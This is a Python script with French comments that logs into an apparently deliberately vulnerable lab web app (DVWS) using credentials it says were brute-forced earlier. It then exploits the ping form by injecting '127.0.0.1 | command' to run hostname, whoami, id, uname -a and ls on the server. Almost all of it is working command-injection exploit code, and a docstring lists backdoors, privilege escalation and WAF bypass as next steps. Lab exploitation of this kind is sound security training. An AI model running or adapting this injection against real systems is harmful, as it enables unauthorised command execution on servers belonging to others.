"""
Script pour tester l'injection de commandes avec pipe sur DVWS
Page sans token CSRF - injection directe
"""

# === IMPORTS ===
import requests  # Pour envoyer des requêtes HTTP (GET, POST)
from bs4 import BeautifulSoup  # Pour parser le HTML et extraire des données

# === CONFIGURATION ===
BASE_URL = "http://10.0.1.10:5780/website"  # URL de base du serveur DVWS
LOGIN_URL = f"{BASE_URL}/login.php"  # URL de la page de connexion
COMMAND_INJECTION_URL = f"{BASE_URL}/vulnerabilities/exec/" # Le chemin /vulnerabilities/exec/ est utilisé car:
                                                            # 1. C'est une page de test dédiée aux injections de commandes dans DVWS
                                                            # 2. Elle contient un formulaire qui exécute des commandes système sans validation
                                                            # 3. Elle simule un ping qui accepte une entrée utilisateur non filtrée
USERNAME = "admin"  # Nom d'utilisateur (trouvé par le script précédent)
PASSWORD = "canyouletmein"  # Mot de passe (trouvé par le script précédent)



"""
⚠️ Limitations dans un vrai cas :
1. Pas de gestion des filtres :
❌ Manque : Détection des caractères bloqués (;, &, |, etc.)
❌ Manque : Techniques de contournement (encodage, alternatives)
2. Pas d'évasion de commandes :
❌ Manque : Gestion des espaces, guillemets, caractères spéciaux
❌ Manque : Techniques d'encodage URL/base64
3. Pas de détection de WAF :
❌ Manque : Détection des Web Application Firewalls
❌ Manque : Contournement des protections
4. Pas de persistance :
❌ Manque : Mise en place de backdoors
❌ Manque : Escalade de privilèges
"""


def get_csrf_token(session, url):
    try:
        response = session.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input and token_input.get('value'):
                return token_input.get('value')
            else:
                raise ValueError("Token CSRF non trouvé dans la page")
        else:
            raise RuntimeError(f"Erreur lors de la requête: code {response.status_code}")
    except requests.exceptions.RequestException as e:
        raise RuntimeError(f"Erreur de connexion au serveur: {str(e)}")



def login(session):
    """
    Se connecte au site DVWS en utilisant les identifiants trouvés précédemment.
    
    POURQUOI CETTE FONCTION EST NÉCESSAIRE :
    - On doit être connecté pour accéder à la page d'injection de commandes
    - On utilise les identifiants trouvés par le script de force brute
    - La connexion maintient la session pour les requêtes suivantes
    
    COMMENT ÇA MARCHE :
    1. Récupérer le token CSRF de la page de login
    2. Préparer les headers pour simuler un navigateur
    3. Envoyer la requête POST avec les identifiants
    4. Vérifier que la connexion a réussi
    """
    print("🔐 Connexion au site DVWS...")
    
    # === ÉTAPE 1 : Récupérer le token CSRF ===
    # Même logique que dans le script précédent
    csrf_token = get_csrf_token(session, LOGIN_URL)
    if not csrf_token:
        print("❌ Impossible de récupérer le token CSRF de login")
        return False
    
    # === ÉTAPE 2 : Préparer les headers pour simuler un navigateur ===
    # Même logique que dans le script précédent
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': LOGIN_URL
    }
    
    # === ÉTAPE 3 : Préparer les données de connexion ===
    # On utilise les identifiants trouvés par le script de force brute
    data = {
        'username': USERNAME,        # admin
        'password': PASSWORD,        # canyouletmein
        'user_token': csrf_token,   # Token CSRF (OBLIGATOIRE!)
        'Login': 'Login'            # Bouton de soumission
    }
    
    try:
        # === ÉTAPE 4 : Envoyer la requête de connexion ===
        response = session.post(LOGIN_URL, data=data, headers=headers, timeout=10)
        
        # === ÉTAPE 5 : Vérifier que la connexion a réussi ===
        if response.status_code == 200:
            # Chercher des indicateurs de succès dans la réponse
            if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                print("✅ Connexion réussie !")
                return True
            else:
                print("❌ Échec de la connexion")
                return False
        else:
            print(f"❌ Erreur HTTP lors de la connexion: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur de connexion: {str(e)}")
        return False



def test_command_injection_with_pipe(session, command):
    """
    Teste l'injection de commandes en utilisant un pipe (|).
    
    POURQUOI CETTE FONCTION EST CRUCIALE :
    - C'est le cœur de l'attaque d'injection de commandes
    - Elle exploite une vulnérabilité dans le formulaire de ping
    - Le pipe (|) permet d'exécuter des commandes supplémentaires
    
    COMMENT ÇA MARCHE :
    1. Le formulaire attend normalement une adresse IP pour faire un ping
    2. On injecte "127.0.0.1 | [commande]" dans le champ IP
    3. Le serveur exécute: ping 127.0.0.1 | [commande]
    4. Le pipe redirige la sortie du ping vers notre commande
    5. Notre commande s'exécute et retourne son résultat
    """
    print(f"🎯 Test d'injection de commande avec pipe: {command}")
    
    # === ÉTAPE 1 : Préparer les headers pour simuler un navigateur ===
    # Même logique que dans les autres scripts
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': COMMAND_INJECTION_URL
    }
    
    # === ÉTAPE 2 : Construire la commande injectée ===
    # TECHNIQUE DU PIPE :
    # - Le formulaire fait normalement: ping 127.0.0.1
    # - On injecte: 127.0.0.1 | [commande]
    # - Le serveur exécute: ping 127.0.0.1 | [commande]
    # - Le pipe (|) redirige la sortie du ping vers notre commande
    # - Notre commande s'exécute et retourne son résultat
    injected_command = f"127.0.0.1 | {command}"
    
    print(f"🔧 Commande injectée: {injected_command}")
    
    # === ÉTAPE 3 : Préparer les données du formulaire ===
    # Cette page n'a pas de token CSRF, donc c'est plus simple
    data = {
        'ip': injected_command,  # Champ IP avec notre injection
        'Submit': 'Submit'       # Bouton de soumission
    }
    
    try:
        # === ÉTAPE 4 : Envoyer la requête POST avec l'injection ===
        response = session.post(COMMAND_INJECTION_URL, data=data, headers=headers, timeout=10)
        
        # === ÉTAPE 5 : Analyser la réponse pour extraire la sortie de la commande ===
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # === RECHERCHE DE LA SORTIE DE LA COMMANDE ===
            # La sortie peut être dans différents endroits selon la structure de la page
            
            # === MÉTHODE 1 : Chercher dans une div spécifique ===
            # Souvent, la sortie est dans une div avec la classe "vulnerable_code_area"
            output_area = soup.find('div', class_='vulnerable_code_area')
            if output_area:
                output_text = output_area.get_text().strip()
                print(f"📄 Sortie de la commande:")
                print("-" * 50)
                print(output_text)
                print("-" * 50)
                return output_text
            
            # === MÉTHODE 2 : Chercher dans les balises <pre> ===
            # Les balises <pre> sont souvent utilisées pour afficher du code/sortie
            pre_tags = soup.find_all('pre')
            for pre in pre_tags:
                text = pre.get_text().strip()
                if text and len(text) > 10:  # Ignorer les pre vides ou très courts
                    print(f"📄 Sortie de la commande (dans <pre>):")
                    print("-" * 50)
                    print(text)
                    print("-" * 50)
                    return text
            
            # === MÉTHODE 3 : Chercher dans toutes les divs ===
            # Parfois la sortie est dans une div sans classe spécifique
            all_divs = soup.find_all('div')
            for div in all_divs:
                text = div.get_text().strip()
                # Chercher des indicateurs de sortie de commande
                if text and len(text) > 20 and ('PING' in text or command in text or 'hostname' in text.lower()):
                    print(f"📄 Sortie de la commande (dans <div>):")
                    print("-" * 50)
                    print(text)
                    print("-" * 50)
                    return text
            
            # === MÉTHODE 4 : Recherche exhaustive ===
            # Chercher dans toutes les balises qui pourraient contenir la sortie
            all_text_elements = soup.find_all(['div', 'p', 'span', 'td', 'pre'])
            for element in all_text_elements:
                text = element.get_text().strip()
                # Vérifier si le texte contient des indicateurs de commande exécutée
                if text and len(text) > 20 and (command in text or 'PING' in text or 'hostname' in text.lower()):
                    print(f"📄 Sortie de la commande trouvée:")
                    print("-" * 50)
                    print(text)
                    print("-" * 50)
                    return text
            
            # === ÉCHEC : Aucune sortie trouvée ===
            print("❌ Aucune sortie de commande trouvée")
            print("🔍 Contenu de la page pour debug:")
            print("-" * 50)
            print(response.text[:1500])
            print("-" * 50)
            return None
        else:
            print(f"❌ Erreur HTTP: {response.status_code}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"❌ Erreur lors de l'injection: {str(e)}")
        return None



def main():
    """
    Fonction principale qui orchestre le test d'injection de commandes.
    
    COMMENT ÇA MARCHE :
    1. Se connecter au site DVWS
    2. Tester l'injection de commandes avec différentes commandes
    3. Analyser les résultats et fournir un rapport
    """
    print("🚀 Test d'injection de commandes avec pipe sur DVWS")
    
    # === ÉTAPE 1 : Créer une session persistante ===
    # Une session permet de maintenir les cookies et la connexion
    session = requests.Session()
    
    # === ÉTAPE 2 : Se connecter au site ===
    # On doit être connecté pour accéder à la page d'injection de commandes
    if not login(session):
        print("❌ Impossible de se connecter. Arrêt du script.")
        return
    print("=" * 60)
    
    # === ÉTAPE 3 : Tester la commande principale ===
    # On commence par 'hostname' car c'est une commande simple et révélatrice
    print("🎯 Test principal: commande 'hostname' avec pipe")
    result = test_command_injection_with_pipe(session, "hostname")
    
    # === ÉTAPE 4 : Analyser le résultat de la commande principale ===
    if result and ("hostname" in result.lower() or any(keyword in result.lower() for keyword in ["localhost", "server", "host", "machine", "ubuntu", "debian", "centos"])):
        print("✅ Commande 'hostname' exécutée avec succès !")
        print(f"📊 Résultat: {result}")
    else:
        print("❌ Commande 'hostname' non exécutée avec pipe")
        
        # === ÉTAPE 5 : Tester d'autres commandes en cas d'échec ===
        # Parfois certaines commandes ne fonctionnent pas, on essaie d'autres
        print("\n🔄 Test avec d'autres commandes...")
        
        # Liste de commandes alternatives à tester
        other_commands = [
            "whoami",      # Affiche l'utilisateur actuel
            "id",          # Affiche les IDs de l'utilisateur
            "pwd",         # Affiche le répertoire courant
            "uname -a",    # Affiche les informations système
            "ls -la",      # Liste les fichiers
            "echo 'test'"  # Commande simple de test
        ]
        
        # Tester chaque commande jusqu'à en trouver une qui fonctionne
        for cmd in other_commands:
            print(f"\n🧪 Test de la commande: {cmd}")
            result = test_command_injection_with_pipe(session, cmd)
            
            # Vérifier si la commande a été exécutée avec succès
            if result and (cmd in result.lower()):
                print(f"✅ Commande '{cmd}' exécutée avec succès !")
                print(f"📊 Résultat: {result}")
                break
            else:
                print(f"❌ Commande '{cmd}' non exécutée")

if __name__ == "__main__":
    main()
